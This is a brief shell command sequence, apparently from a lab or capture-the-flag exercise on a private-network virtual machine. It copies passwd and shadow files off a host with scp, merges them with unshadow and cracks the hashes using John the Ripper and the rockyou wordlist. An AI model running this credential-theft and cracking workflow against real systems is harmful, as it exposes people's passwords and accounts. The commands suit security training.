scp apprentice@192.168.56.50:/tmp/passwd .
scp apprentice@192.168.56.50:/tmp/shadow .

unshadow passwd shadow > hashes.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
